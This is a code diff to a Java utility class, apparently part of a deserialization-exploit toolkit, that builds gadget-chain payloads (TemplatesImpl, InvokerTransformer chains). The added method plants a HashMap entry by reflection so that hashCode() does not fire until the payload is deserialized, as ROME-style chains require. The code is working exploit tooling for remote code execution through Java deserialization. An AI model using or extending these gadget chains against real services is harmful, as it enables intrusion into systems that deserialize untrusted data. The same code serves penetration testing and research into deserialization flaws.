@@ -6,6 +6,10 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.util.HashMap;
+
 /**
  * Gadget chain construction utilities.
  * Builds TemplatesImpl payloads via Javassist and InvokerTransformer chains.
@@ -97,5 +101,33 @@ public final class GadgetUtils {
      */
     public static ChainedTransformer makeInertChain() {
         return new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
+    }
+
+    /**
+     * Create a HashMap with entries added via reflection to avoid triggering hashCode().
+     * Used by ROME and other chains where hashCode() IS the trigger.
+     */
+    public static HashMap<Object, Object> makeHashMap(Object key, Object value) throws Exception {
+        HashMap<Object, Object> map = new HashMap<>();
+
+        Class<?> nodeClass;
+        try {
+            nodeClass = Class.forName("java.util.HashMap$Node");
+        } catch (ClassNotFoundException e) {
+            nodeClass = Class.forName("java.util.HashMap$Entry"); // JDK 7
+        }
+
+        Constructor<?> nodeCtor = nodeClass.getDeclaredConstructor(
+                int.class, Object.class, Object.class, nodeClass);
+        nodeCtor.setAccessible(true);
+
+        Object node = nodeCtor.newInstance(0, key, value, null);
+        Object table = Array.newInstance(nodeClass, 2);
+        Array.set(table, 0, node);
+
+        ReflectionUtils.setFieldValue(map, "table", table);
+        ReflectionUtils.setFieldValue(map, "size", 1);
+
+        return map;
     }
 }
